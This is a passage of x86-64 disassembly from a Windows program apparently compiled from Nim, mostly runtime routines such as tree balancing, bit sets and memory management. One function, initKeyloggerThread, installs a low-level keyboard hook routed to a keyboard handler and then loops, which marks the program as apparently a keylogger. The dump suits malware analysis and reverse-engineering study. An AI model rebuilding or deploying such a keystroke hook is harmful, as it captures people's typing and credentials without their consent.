  401694:	0f 95 c2             	setne  %dl
  401697:	89 d0                	mov    %edx,%eax
  401699:	48 83 c4 28          	add    $0x28,%rsp
  40169d:	c3                   	ret

000000000040169e <selectBranch__2us2RQByTh81i9aW4EEgfmw>:
  40169e:	48 8b 42 10          	mov    0x10(%rdx),%rax
  4016a2:	48 8b 00             	mov    (%rax),%rax
  4016a5:	48 83 f8 02          	cmp    $0x2,%rax
  4016a9:	74 23                	je     4016ce <selectBranch__2us2RQByTh81i9aW4EEgfmw+0x30>
  4016ab:	7f 07                	jg     4016b4 <selectBranch__2us2RQByTh81i9aW4EEgfmw+0x16>
  4016ad:	48 ff c8             	dec    %rax
  4016b0:	74 12                	je     4016c4 <selectBranch__2us2RQByTh81i9aW4EEgfmw+0x26>
  4016b2:	eb 0c                	jmp    4016c0 <selectBranch__2us2RQByTh81i9aW4EEgfmw+0x22>
  4016b4:	48 83 f8 04          	cmp    $0x4,%rax
  4016b8:	74 1e                	je     4016d8 <selectBranch__2us2RQByTh81i9aW4EEgfmw+0x3a>
  4016ba:	48 83 f8 08          	cmp    $0x8,%rax
  4016be:	74 21                	je     4016e1 <selectBranch__2us2RQByTh81i9aW4EEgfmw+0x43>
  4016c0:	31 c0                	xor    %eax,%eax
  4016c2:	eb 25                	jmp    4016e9 <selectBranch__2us2RQByTh81i9aW4EEgfmw+0x4b>
  4016c4:	48 8b 42 08          	mov    0x8(%rdx),%rax
  4016c8:	0f b6 04 08          	movzbl (%rax,%rcx,1),%eax
  4016cc:	eb 1b                	jmp    4016e9 <selectBranch__2us2RQByTh81i9aW4EEgfmw+0x4b>
  4016ce:	48 8b 42 08          	mov    0x8(%rdx),%rax
  4016d2:	0f b7 04 08          	movzwl (%rax,%rcx,1),%eax
  4016d6:	eb 11                	jmp    4016e9 <selectBranch__2us2RQByTh81i9aW4EEgfmw+0x4b>
  4016d8:	48 8b 42 08          	mov    0x8(%rdx),%rax
  4016dc:	8b 04 08             	mov    (%rax,%rcx,1),%eax
  4016df:	eb 08                	jmp    4016e9 <selectBranch__2us2RQByTh81i9aW4EEgfmw+0x4b>
  4016e1:	48 8b 42 08          	mov    0x8(%rdx),%rax
  4016e5:	48 8b 04 08          	mov    (%rax,%rcx,1),%rax
  4016e9:	48 8b 4a 20          	mov    0x20(%rdx),%rcx
  4016ed:	48 8b 52 28          	mov    0x28(%rdx),%rdx
  4016f1:	48 39 c1             	cmp    %rax,%rcx
  4016f4:	76 09                	jbe    4016ff <selectBranch__2us2RQByTh81i9aW4EEgfmw+0x61>
  4016f6:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
  4016fa:	48 85 c0             	test   %rax,%rax
  4016fd:	75 04                	jne    401703 <selectBranch__2us2RQByTh81i9aW4EEgfmw+0x65>
  4016ff:	48 8b 04 ca          	mov    (%rdx,%rcx,8),%rax
  401703:	c3                   	ret

0000000000401704 <Marker_tyRef__HsJiUUcO9cHBdUCi0HwkSTA>:
  401704:	c3                   	ret

0000000000401705 <split__NJo8pxZdXEAIa7wkHls9cOw_2>:
  401705:	48 8b 01             	mov    (%rcx),%rax
  401708:	48 8b 50 08          	mov    0x8(%rax),%rdx
  40170c:	4c 8b 48 20          	mov    0x20(%rax),%r9
  401710:	4c 8b 42 08          	mov    0x8(%rdx),%r8
  401714:	4d 39 48 20          	cmp    %r9,0x20(%r8)
  401718:	75 17                	jne    401731 <split__NJo8pxZdXEAIa7wkHls9cOw_2+0x2c>
  40171a:	48 89 11             	mov    %rdx,(%rcx)
  40171d:	48 8b 12             	mov    (%rdx),%rdx
  401720:	48 89 50 08          	mov    %rdx,0x8(%rax)
  401724:	48 8b 11             	mov    (%rcx),%rdx
  401727:	48 89 02             	mov    %rax,(%rdx)
  40172a:	48 8b 01             	mov    (%rcx),%rax
  40172d:	48 ff 40 20          	incq   0x20(%rax)
  401731:	c3                   	ret

0000000000401732 <skew__NJo8pxZdXEAIa7wkHls9cOw>:
  401732:	48 8b 01             	mov    (%rcx),%rax
  401735:	48 8b 10             	mov    (%rax),%rdx
  401738:	4c 8b 40 20          	mov    0x20(%rax),%r8
  40173c:	4c 39 42 20          	cmp    %r8,0x20(%rdx)
  401740:	75 11                	jne    401753 <skew__NJo8pxZdXEAIa7wkHls9cOw+0x21>
  401742:	48 89 11             	mov    %rdx,(%rcx)
  401745:	48 8b 52 08          	mov    0x8(%rdx),%rdx
  401749:	48 89 10             	mov    %rdx,(%rax)
  40174c:	48 8b 11             	mov    (%rcx),%rdx
  40174f:	48 89 42 08          	mov    %rax,0x8(%rdx)
  401753:	c3                   	ret

0000000000401754 <del__Io5JDKCS5u26IEWw0J53hQ>:
  401754:	57                   	push   %rdi
  401755:	56                   	push   %rsi
  401756:	53                   	push   %rbx
  401757:	48 83 ec 20          	sub    $0x20,%rsp
  40175b:	48 89 d6             	mov    %rdx,%rsi
  40175e:	48 8b 12             	mov    (%rdx),%rdx
  401761:	48 89 cb             	mov    %rcx,%rbx
  401764:	4c 89 c7             	mov    %r8,%rdi
  401767:	48 3b 12             	cmp    (%rdx),%rdx
  40176a:	0f 84 07 01 00 00    	je     401877 <del__Io5JDKCS5u26IEWw0J53hQ+0x123>
  401770:	4c 3b 42 10          	cmp    0x10(%rdx),%r8
  401774:	48 89 91 b8 30 00 00 	mov    %rdx,0x30b8(%rcx)
  40177b:	72 0e                	jb     40178b <del__Io5JDKCS5u26IEWw0J53hQ+0x37>
  40177d:	48 89 91 b0 30 00 00 	mov    %rdx,0x30b0(%rcx)
  401784:	48 8b 06             	mov    (%rsi),%rax
  401787:	48 8d 50 08          	lea    0x8(%rax),%rdx
  40178b:	49 89 f8             	mov    %rdi,%r8
  40178e:	48 89 d9             	mov    %rbx,%rcx
  401791:	e8 be ff ff ff       	call   401754 <del__Io5JDKCS5u26IEWw0J53hQ>
  401796:	48 8b 16             	mov    (%rsi),%rdx
  401799:	48 3b 93 b8 30 00 00 	cmp    0x30b8(%rbx),%rdx
  4017a0:	75 12                	jne    4017b4 <del__Io5JDKCS5u26IEWw0J53hQ+0x60>
  4017a2:	48 8b 83 b0 30 00 00 	mov    0x30b0(%rbx),%rax
  4017a9:	48 3b 00             	cmp    (%rax),%rax
  4017ac:	74 06                	je     4017b4 <del__Io5JDKCS5u26IEWw0J53hQ+0x60>
  4017ae:	48 3b 78 10          	cmp    0x10(%rax),%rdi
  4017b2:	74 16                	je     4017ca <del__Io5JDKCS5u26IEWw0J53hQ+0x76>
  4017b4:	48 8b 0a             	mov    (%rdx),%rcx
  4017b7:	48 8b 42 20          	mov    0x20(%rdx),%rax
  4017bb:	48 ff c8             	dec    %rax
  4017be:	48 39 41 20          	cmp    %rax,0x20(%rcx)
  4017c2:	48 8b 4a 08          	mov    0x8(%rdx),%rcx
  4017c6:	7d 5c                	jge    401824 <del__Io5JDKCS5u26IEWw0J53hQ+0xd0>
  4017c8:	eb 60                	jmp    40182a <del__Io5JDKCS5u26IEWw0J53hQ+0xd6>
  4017ca:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
  4017ce:	48 83 bb d8 30 00 00 	cmpq   $0x0,0x30d8(%rbx)
  4017d5:	00 
  4017d6:	48 8b 52 18          	mov    0x18(%rdx),%rdx
  4017da:	48 89 48 10          	mov    %rcx,0x10(%rax)
  4017de:	48 89 50 18          	mov    %rdx,0x18(%rax)
  4017e2:	48 8d 83 d8 30 00 00 	lea    0x30d8(%rbx),%rax
  4017e9:	75 0e                	jne    4017f9 <del__Io5JDKCS5u26IEWw0J53hQ+0xa5>
  4017eb:	48 89 83 d8 30 00 00 	mov    %rax,0x30d8(%rbx)
  4017f2:	48 89 83 e0 30 00 00 	mov    %rax,0x30e0(%rbx)
  4017f9:	48 89 83 b0 30 00 00 	mov    %rax,0x30b0(%rbx)
  401800:	48 8b 06             	mov    (%rsi),%rax
  401803:	48 8b 40 08          	mov    0x8(%rax),%rax
  401807:	48 89 06             	mov    %rax,(%rsi)
  40180a:	48 8b 83 b8 30 00 00 	mov    0x30b8(%rbx),%rax
  401811:	48 8b 93 c0 30 00 00 	mov    0x30c0(%rbx),%rdx
  401818:	48 89 10             	mov    %rdx,(%rax)
  40181b:	48 89 83 c0 30 00 00 	mov    %rax,0x30c0(%rbx)
  401822:	eb 53                	jmp    401877 <del__Io5JDKCS5u26IEWw0J53hQ+0x123>
  401824:	48 3b 41 20          	cmp    0x20(%rcx),%rax
  401828:	7e 4d                	jle    401877 <del__Io5JDKCS5u26IEWw0J53hQ+0x123>
  40182a:	48 89 42 20          	mov    %rax,0x20(%rdx)
  40182e:	48 3b 41 20          	cmp    0x20(%rcx),%rax
  401832:	7d 04                	jge    401838 <del__Io5JDKCS5u26IEWw0J53hQ+0xe4>
  401834:	48 89 41 20          	mov    %rax,0x20(%rcx)
  401838:	48 89 f1             	mov    %rsi,%rcx
  40183b:	e8 f2 fe ff ff       	call   401732 <skew__NJo8pxZdXEAIa7wkHls9cOw>
  401840:	48 8b 06             	mov    (%rsi),%rax
  401843:	48 8d 48 08          	lea    0x8(%rax),%rcx
  401847:	e8 e6 fe ff ff       	call   401732 <skew__NJo8pxZdXEAIa7wkHls9cOw>
  40184c:	48 8b 06             	mov    (%rsi),%rax
  40184f:	48 8b 48 08          	mov    0x8(%rax),%rcx
  401853:	48 83 c1 08          	add    $0x8,%rcx
  401857:	e8 d6 fe ff ff       	call   401732 <skew__NJo8pxZdXEAIa7wkHls9cOw>
  40185c:	48 89 f1             	mov    %rsi,%rcx
  40185f:	e8 a1 fe ff ff       	call   401705 <split__NJo8pxZdXEAIa7wkHls9cOw_2>
  401864:	48 8b 0e             	mov    (%rsi),%rcx
  401867:	48 83 c1 08          	add    $0x8,%rcx
  40186b:	48 83 c4 20          	add    $0x20,%rsp
  40186f:	5b                   	pop    %rbx
  401870:	5e                   	pop    %rsi
  401871:	5f                   	pop    %rdi
  401872:	e9 8e fe ff ff       	jmp    401705 <split__NJo8pxZdXEAIa7wkHls9cOw_2>
  401877:	48 83 c4 20          	add    $0x20,%rsp
  40187b:	5b                   	pop    %rbx
  40187c:	5e                   	pop    %rsi
  40187d:	5f                   	pop    %rdi
  40187e:	c3                   	ret

000000000040187f <intSetGet__O3FRrWKKUdi8uRTGxiPdIg>:
  40187f:	0f b6 c2             	movzbl %dl,%eax
  401882:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
  401886:	48 85 c0             	test   %rax,%rax
  401889:	74 0b                	je     401896 <intSetGet__O3FRrWKKUdi8uRTGxiPdIg+0x17>
  40188b:	48 39 50 08          	cmp    %rdx,0x8(%rax)
  40188f:	74 05                	je     401896 <intSetGet__O3FRrWKKUdi8uRTGxiPdIg+0x17>
  401891:	48 8b 00             	mov    (%rax),%rax
  401894:	eb f0                	jmp    401886 <intSetGet__O3FRrWKKUdi8uRTGxiPdIg+0x7>
  401896:	c3                   	ret

0000000000401897 <excl__9cAWqpgI1NbhhZ3cVPHhI5A>:
  401897:	48 83 ec 28          	sub    $0x28,%rsp
  40189b:	49 89 d0             	mov    %rdx,%r8
  40189e:	48 c1 fa 09          	sar    $0x9,%rdx
  4018a2:	e8 d8 ff ff ff       	call   40187f <intSetGet__O3FRrWKKUdi8uRTGxiPdIg>
  4018a7:	48 85 c0             	test   %rax,%rax
  4018aa:	74 21                	je     4018cd <excl__9cAWqpgI1NbhhZ3cVPHhI5A+0x36>
  4018ac:	4c 89 c1             	mov    %r8,%rcx
  4018af:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  4018b5:	81 e1 ff 01 00 00    	and    $0x1ff,%ecx
  4018bb:	48 89 ca             	mov    %rcx,%rdx
  4018be:	49 d3 e0             	shl    %cl,%r8
  4018c1:	48 c1 fa 06          	sar    $0x6,%rdx
  4018c5:	49 f7 d0             	not    %r8
  4018c8:	4c 21 44 d0 10       	and    %r8,0x10(%rax,%rdx,8)
  4018cd:	48 83 c4 28          	add    $0x28,%rsp
  4018d1:	c3                   	ret

00000000004018d2 <contains__9b5xR7VBZVwQDvk5Nr9bDKdQ>:
  4018d2:	48 83 ec 28          	sub    $0x28,%rsp
  4018d6:	49 89 d0             	mov    %rdx,%r8
  4018d9:	48 c1 fa 09          	sar    $0x9,%rdx
  4018dd:	e8 9d ff ff ff       	call   40187f <intSetGet__O3FRrWKKUdi8uRTGxiPdIg>
  4018e2:	31 d2                	xor    %edx,%edx
  4018e4:	48 85 c0             	test   %rax,%rax
  4018e7:	74 1b                	je     401904 <contains__9b5xR7VBZVwQDvk5Nr9bDKdQ+0x32>
  4018e9:	4c 89 c1             	mov    %r8,%rcx
  4018ec:	81 e1 ff 01 00 00    	and    $0x1ff,%ecx
  4018f2:	48 89 ca             	mov    %rcx,%rdx
  4018f5:	48 c1 fa 06          	sar    $0x6,%rdx
  4018f9:	48 8b 54 d0 10       	mov    0x10(%rax,%rdx,8),%rdx
  4018fe:	48 d3 ea             	shr    %cl,%rdx
  401901:	83 e2 01             	and    $0x1,%edx
  401904:	89 d0                	mov    %edx,%eax
  401906:	48 83 c4 28          	add    $0x28,%rsp
  40190a:	c3                   	ret

000000000040190b <msbit__NR8XkKls428clCUr82szCgsystem>:
  40190b:	81 f9 ff ff 00 00    	cmp    $0xffff,%ecx
  401911:	89 c8                	mov    %ecx,%eax
  401913:	76 13                	jbe    401928 <msbit__NR8XkKls428clCUr82szCgsystem+0x1d>
  401915:	81 f9 00 00 00 01    	cmp    $0x1000000,%ecx
  40191b:	48 19 c9             	sbb    %rcx,%rcx
  40191e:	48 83 e1 f8          	and    $0xfffffffffffffff8,%rcx
  401922:	48 83 c1 18          	add    $0x18,%rcx
  401926:	eb 0f                	jmp    401937 <msbit__NR8XkKls428clCUr82szCgsystem+0x2c>
  401928:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  40192e:	48 19 c9             	sbb    %rcx,%rcx
  401931:	48 f7 d1             	not    %rcx
  401934:	83 e1 08             	and    $0x8,%ecx
  401937:	48 8d 15 e2 f5 00 00 	lea    0xf5e2(%rip),%rdx        # 410f20 <fsLookupTable__Gn52IZvqY4slyBTOYwGNRQ>
  40193e:	d3 e8                	shr    %cl,%eax
  401940:	48 0f be 04 02       	movsbq (%rdx,%rax,1),%rax
  401945:	48 01 c8             	add    %rcx,%rax
  401948:	c3                   	ret

0000000000401949 <waitSysCond__1aSBSEAel8lRFkufku8IRA.constprop.24>:
  401949:	53                   	push   %rbx
  40194a:	48 83 ec 20          	sub    $0x20,%rsp
  40194e:	48 89 cb             	mov    %rcx,%rbx
  401951:	48 8d 0d 18 95 02 00 	lea    0x29518(%rip),%rcx        # 42ae70 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x30>
  401958:	ff 15 5e 69 04 00    	call   *0x4695e(%rip)        # 4482bc <__imp_LeaveCriticalSection>
  40195e:	48 8b 0b             	mov    (%rbx),%rcx
  401961:	83 ca ff             	or     $0xffffffff,%edx
  401964:	ff 15 36 c8 02 00    	call   *0x2c836(%rip)        # 42e1a0 <Dl_1285035_>
  40196a:	48 8d 0d ff 94 02 00 	lea    0x294ff(%rip),%rcx        # 42ae70 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x30>
  401971:	48 83 c4 20          	add    $0x20,%rsp
  401975:	5b                   	pop    %rbx
  401976:	48 ff 25 ef 68 04 00 	rex.W jmp *0x468ef(%rip)        # 44826c <__imp_EnterCriticalSection>

000000000040197d <appendString.part.0>:
  40197d:	57                   	push   %rdi
  40197e:	56                   	push   %rsi
  40197f:	48 8b 3a             	mov    (%rdx),%rdi
  401982:	48 8d 72 10          	lea    0x10(%rdx),%rsi
  401986:	48 89 c8             	mov    %rcx,%rax
  401989:	48 8b 09             	mov    (%rcx),%rcx
  40198c:	4c 8d 44 08 10       	lea    0x10(%rax,%rcx,1),%r8
  401991:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
  401995:	4c 89 c7             	mov    %r8,%rdi
  401998:	f3 a4                	rep movsb (%rsi),(%rdi)
  40199a:	48 8b 12             	mov    (%rdx),%rdx
  40199d:	48 01 10             	add    %rdx,(%rax)
  4019a0:	5e                   	pop    %rsi
  4019a1:	5f                   	pop    %rdi
  4019a2:	c3                   	ret

00000000004019a3 <appendString.lto_priv.48>:
  4019a3:	48 85 d2             	test   %rdx,%rdx
  4019a6:	74 02                	je     4019aa <appendString.lto_priv.48+0x7>
  4019a8:	eb d3                	jmp    40197d <appendString.part.0>
  4019aa:	c3                   	ret

00000000004019ab <nimLoadLibrary>:
  4019ab:	48 83 ec 28          	sub    $0x28,%rsp
  4019af:	e8 9d fb ff ff       	call   401551 <nimToCStringConv.lto_priv.52>
  4019b4:	48 89 c1             	mov    %rax,%rcx
  4019b7:	48 83 c4 28          	add    $0x28,%rsp
  4019bb:	48 ff 25 02 69 04 00 	rex.W jmp *0x46902(%rip)        # 4482c4 <__imp_LoadLibraryA>

00000000004019c2 <nimZeroMem.lto_priv.58>:
  4019c2:	57                   	push   %rdi
  4019c3:	31 c0                	xor    %eax,%eax
  4019c5:	49 89 c8             	mov    %rcx,%r8
  4019c8:	48 89 d1             	mov    %rdx,%rcx
  4019cb:	4c 89 c7             	mov    %r8,%rdi
  4019ce:	f3 aa                	rep stos %al,(%rdi)
  4019d0:	5f                   	pop    %rdi
  4019d1:	c3                   	ret

00000000004019d2 <initKeyloggerThread__LcMnpr43pCvLNLQ9bKGTVJw>:
  4019d2:	53                   	push   %rbx
  4019d3:	48 83 ec 50          	sub    $0x50,%rsp
  4019d7:	48 8d 15 d8 42 00 00 	lea    0x42d8(%rip),%rdx        # 405cb6 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw>
  4019de:	b9 0d 00 00 00       	mov    $0xd,%ecx
  4019e3:	45 31 c9             	xor    %r9d,%r9d
  4019e6:	45 31 c0             	xor    %r8d,%r8d
  4019e9:	ff 15 01 93 02 00    	call   *0x29301(%rip)        # 42acf0 <Dl_32210001_>
  4019ef:	ba 30 00 00 00       	mov    $0x30,%edx
  4019f4:	48 8d 5c 24 20       	lea    0x20(%rsp),%rbx
  4019f9:	48 89 d9             	mov    %rbx,%rcx
  4019fc:	e8 c1 ff ff ff       	call   4019c2 <nimZeroMem.lto_priv.58>
  401a01:	45 31 c9             	xor    %r9d,%r9d
  401a04:	45 31 c0             	xor    %r8d,%r8d
  401a07:	31 d2                	xor    %edx,%edx
  401a09:	48 89 d9             	mov    %rbx,%rcx
  401a0c:	ff 15 ce 92 02 00    	call   *0x292ce(%rip)        # 42ace0 <Dl_31790001_>
  401a12:	85 c0                	test   %eax,%eax
  401a14:	75 eb                	jne    401a01 <initKeyloggerThread__LcMnpr43pCvLNLQ9bKGTVJw+0x2f>
  401a16:	48 83 c4 50          	add    $0x50,%rsp
  401a1a:	5b                   	pop    %rbx
  401a1b:	c3                   	ret

0000000000401a1c <next__am1q4dBd9cls9au5CcmkX5oA>:
  401a1c:	57                   	push   %rdi
  401a1d:	56                   	push   %rsi
  401a1e:	53                   	push   %rbx
  401a1f:	48 83 ec 40          	sub    $0x40,%rsp
  401a23:	48 89 d6             	mov    %rdx,%rsi
  401a26:	48 89 cf             	mov    %rcx,%rdi
  401a29:	ba 10 00 00 00       	mov    $0x10,%edx
  401a2e:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
  401a33:	4c 89 c3             	mov    %r8,%rbx
  401a36:	e8 87 ff ff ff       	call   4019c2 <nimZeroMem.lto_priv.58>
  401a3b:	48 8b 16             	mov    (%rsi),%rdx
  401a3e:	80 7e 10 00          	cmpb   $0x0,0x10(%rsi)
  401a42:	48 89 56 08          	mov    %rdx,0x8(%rsi)
  401a46:	75 4e                	jne    401a96 <next__am1q4dBd9cls9au5CcmkX5oA+0x7a>
  401a48:	8a 44 13 10          	mov    0x10(%rbx,%rdx,1),%al
  401a4c:	3c 5c                	cmp    $0x5c,%al
  401a4e:	74 04                	je     401a54 <next__am1q4dBd9cls9au5CcmkX5oA+0x38>
  401a50:	3c 2f                	cmp    $0x2f,%al
  401a52:	75 42                	jne    401a96 <next__am1q4dBd9cls9au5CcmkX5oA+0x7a>
  401a54:	48 8b 0b             	mov    (%rbx),%rcx
  401a57:	48 8d 42 01          	lea    0x1(%rdx),%rax
  401a5b:	48 89 06             	mov    %rax,(%rsi)
  401a5e:	48 39 c8             	cmp    %rcx,%rax
  401a61:	7d 42                	jge    401aa5 <next__am1q4dBd9cls9au5CcmkX5oA+0x89>
  401a63:	80 7c 13 11 5c       	cmpb   $0x5c,0x11(%rbx,%rdx,1)
  401a68:	75 3b                	jne    401aa5 <next__am1q4dBd9cls9au5CcmkX5oA+0x89>
  401a6a:	48 8d 42 02          	lea    0x2(%rdx),%rax
  401a6e:	48 39 c8             	cmp    %rcx,%rax
  401a71:	7d 32                	jge    401aa5 <next__am1q4dBd9cls9au5CcmkX5oA+0x89>
  401a73:	80 7c 13 12 5c       	cmpb   $0x5c,0x12(%rbx,%rdx,1)
  401a78:	74 2b                	je     401aa5 <next__am1q4dBd9cls9au5CcmkX5oA+0x89>
  401a7a:	48 89 06             	mov    %rax,(%rsi)
  401a7d:	eb 26                	jmp    401aa5 <next__am1q4dBd9cls9au5CcmkX5oA+0x89>
  401a7f:	48 39 c1             	cmp    %rax,%rcx
  401a82:	7d 21                	jge    401aa5 <next__am1q4dBd9cls9au5CcmkX5oA+0x89>
  401a84:	8a 44 0b 10          	mov    0x10(%rbx,%rcx,1),%al
  401a88:	3c 5c                	cmp    $0x5c,%al
  401a8a:	74 19                	je     401aa5 <next__am1q4dBd9cls9au5CcmkX5oA+0x89>
  401a8c:	3c 2f                	cmp    $0x2f,%al
  401a8e:	74 15                	je     401aa5 <next__am1q4dBd9cls9au5CcmkX5oA+0x89>
  401a90:	48 ff c1             	inc    %rcx
  401a93:	48 89 0e             	mov    %rcx,(%rsi)
  401a96:	31 c0                	xor    %eax,%eax
  401a98:	48 85 db             	test   %rbx,%rbx
  401a9b:	48 8b 0e             	mov    (%rsi),%rcx
  401a9e:	74 df                	je     401a7f <next__am1q4dBd9cls9au5CcmkX5oA+0x63>
  401aa0:	48 8b 03             	mov    (%rbx),%rax
  401aa3:	eb da                	jmp    401a7f <next__am1q4dBd9cls9au5CcmkX5oA+0x63>
  401aa5:	48 8b 0e             	mov    (%rsi),%rcx
  401aa8:	48 39 ca             	cmp    %rcx,%rdx
  401aab:	7c 2b                	jl     401ad8 <next__am1q4dBd9cls9au5CcmkX5oA+0xbc>
  401aad:	31 c0                	xor    %eax,%eax
  401aaf:	48 85 db             	test   %rbx,%rbx
  401ab2:	74 03                	je     401ab7 <next__am1q4dBd9cls9au5CcmkX5oA+0x9b>
  401ab4:	48 8b 03             	mov    (%rbx),%rax
  401ab7:	48 39 c1             	cmp    %rax,%rcx
  401aba:	7d 3e                	jge    401afa <next__am1q4dBd9cls9au5CcmkX5oA+0xde>
  401abc:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  401ac1:	49 89 d8             	mov    %rbx,%r8
  401ac4:	48 89 f2             	mov    %rsi,%rdx
  401ac7:	e8 50 ff ff ff       	call   401a1c <next__am1q4dBd9cls9au5CcmkX5oA>
  401acc:	0f 10 44 24 20       	movups 0x20(%rsp),%xmm0
  401ad1:	0f 29 44 24 30       	movaps %xmm0,0x30(%rsp)
  401ad6:	eb 22                	jmp    401afa <next__am1q4dBd9cls9au5CcmkX5oA+0xde>
  401ad8:	48 ff c9             	dec    %rcx
  401adb:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
  401ae0:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
  401ae5:	eb 13                	jmp    401afa <next__am1q4dBd9cls9au5CcmkX5oA+0xde>
  401ae7:	48 39 c2             	cmp    %rax,%rdx
  401aea:	7d 21                	jge    401b0d <next__am1q4dBd9cls9au5CcmkX5oA+0xf1>
  401aec:	8a 44 13 10          	mov    0x10(%rbx,%rdx,1),%al
  401af0:	3c 5c                	cmp    $0x5c,%al
  401af2:	75 15                	jne    401b09 <next__am1q4dBd9cls9au5CcmkX5oA+0xed>
  401af4:	48 ff c2             	inc    %rdx
  401af7:	48 89 16             	mov    %rdx,(%rsi)
  401afa:	31 c0                	xor    %eax,%eax
  401afc:	48 85 db             	test   %rbx,%rbx
  401aff:	48 8b 16             	mov    (%rsi),%rdx
  401b02:	74 e3                	je     401ae7 <next__am1q4dBd9cls9au5CcmkX5oA+0xcb>
  401b04:	48 8b 03             	mov    (%rbx),%rax
  401b07:	eb de                	jmp    401ae7 <next__am1q4dBd9cls9au5CcmkX5oA+0xcb>
  401b09:	3c 2f                	cmp    $0x2f,%al
  401b0b:	74 e7                	je     401af4 <next__am1q4dBd9cls9au5CcmkX5oA+0xd8>
  401b0d:	0f 28 4c 24 30       	movaps 0x30(%rsp),%xmm1
  401b12:	48 89 f8             	mov    %rdi,%rax
  401b15:	c6 46 10 01          	movb   $0x1,0x10(%rsi)
  401b19:	0f 11 0f             	movups %xmm1,(%rdi)
  401b1c:	48 83 c4 40          	add    $0x40,%rsp
  401b20:	5b                   	pop    %rbx
  401b21:	5e                   	pop    %rsi
  401b22:	5f                   	pop    %rdi
  401b23:	c3                   	ret

0000000000401b24 <mappingInsert__SRLfEtcWb2dn0ht85HEwbQsystem>:
  401b24:	48 83 ec 38          	sub    $0x38,%rsp
  401b28:	49 89 ca             	mov    %rcx,%r10
  401b2b:	49 89 d1             	mov    %rdx,%r9
  401b2e:	ba 10 00 00 00       	mov    $0x10,%edx
  401b33:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  401b38:	e8 85 fe ff ff       	call   4019c2 <nimZeroMem.lto_priv.58>
  401b3d:	44 89 c9             	mov    %r9d,%ecx
  401b40:	e8 c6 fd ff ff       	call   40190b <msbit__NR8XkKls428clCUr82szCgsystem>
  401b45:	8d 48 fb             	lea    -0x5(%rax),%ecx
  401b48:	48 83 e8 06          	sub    $0x6,%rax
  401b4c:	49 d3 f9             	sar    %cl,%r9
  401b4f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  401b54:	4c 89 d0             	mov    %r10,%rax
  401b57:	49 83 e9 20          	sub    $0x20,%r9
  401b5b:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
  401b60:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
  401b65:	41 0f 11 02          	movups %xmm0,(%r10)
  401b69:	48 83 c4 38          	add    $0x38,%rsp
  401b6d:	c3                   	ret

0000000000401b6e <removeChunkFromMatrix__YSJZJgeU5UU2aa8GNvs3WA_2>:
  401b6e:	53                   	push   %rbx
  401b6f:	48 83 ec 30          	sub    $0x30,%rsp
  401b73:	49 89 d3             	mov    %rdx,%r11
  401b76:	48 8b 52 08          	mov    0x8(%rdx),%rdx
  401b7a:	48 89 cb             	mov    %rcx,%rbx
  401b7d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  401b82:	e8 9d ff ff ff       	call   401b24 <mappingInsert__SRLfEtcWb2dn0ht85HEwbQsystem>
  401b87:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
  401b8c:	49 8b 43 10          	mov    0x10(%r11),%rax
  401b90:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
  401b95:	48 85 c0             	test   %rax,%rax
  401b98:	74 08                	je     401ba2 <removeChunkFromMatrix__YSJZJgeU5UU2aa8GNvs3WA_2+0x34>
  401b9a:	49 8b 53 18          	mov    0x18(%r11),%rdx
  401b9e:	48 89 50 18          	mov    %rdx,0x18(%rax)
  401ba2:	49 8b 53 18          	mov    0x18(%r11),%rdx
  401ba6:	48 85 d2             	test   %rdx,%rdx
  401ba9:	74 04                	je     401baf <removeChunkFromMatrix__YSJZJgeU5UU2aa8GNvs3WA_2+0x41>
  401bab:	48 89 42 10          	mov    %rax,0x10(%rdx)
  401baf:	4c 89 c0             	mov    %r8,%rax
  401bb2:	48 c1 e0 05          	shl    $0x5,%rax
  401bb6:	48 01 c8             	add    %rcx,%rax
  401bb9:	48 8d 14 c3          	lea    (%rbx,%rax,8),%rdx
  401bbd:	4c 39 9a 78 10 00 00 	cmp    %r11,0x1078(%rdx)
  401bc4:	75 45                	jne    401c0b <removeChunkFromMatrix__YSJZJgeU5UU2aa8GNvs3WA_2+0x9d>
  401bc6:	49 8b 43 10          	mov    0x10(%r11),%rax
  401bca:	48 85 c0             	test   %rax,%rax
  401bcd:	48 89 82 78 10 00 00 	mov    %rax,0x1078(%rdx)
  401bd4:	75 35                	jne    401c0b <removeChunkFromMatrix__YSJZJgeU5UU2aa8GNvs3WA_2+0x9d>
  401bd6:	4e 8d 0c 83          	lea    (%rbx,%r8,4),%r9
  401bda:	b8 01 00 00 00       	mov    $0x1,%eax
  401bdf:	83 e1 1f             	and    $0x1f,%ecx
  401be2:	48 89 c2             	mov    %rax,%rdx
  401be5:	48 d3 e2             	shl    %cl,%rdx
  401be8:	f7 d2                	not    %edx
  401bea:	41 23 91 14 10 00 00 	and    0x1014(%r9),%edx
  401bf1:	41 89 91 14 10 00 00 	mov    %edx,0x1014(%r9)
  401bf8:	75 11                	jne    401c0b <removeChunkFromMatrix__YSJZJgeU5UU2aa8GNvs3WA_2+0x9d>
  401bfa:	44 89 c1             	mov    %r8d,%ecx
  401bfd:	83 e1 1f             	and    $0x1f,%ecx
  401c00:	48 d3 e0             	shl    %cl,%rax
  401c03:	f7 d0                	not    %eax
  401c05:	21 83 10 10 00 00    	and    %eax,0x1010(%rbx)
  401c0b:	49 c7 43 18 00 00 00 	movq   $0x0,0x18(%r11)
  401c12:	00 
  401c13:	49 c7 43 10 00 00 00 	movq   $0x0,0x10(%r11)
  401c1a:	00 
  401c1b:	48 83 c4 30          	add    $0x30,%rsp
  401c1f:	5b                   	pop    %rbx
  401c20:	c3                   	ret

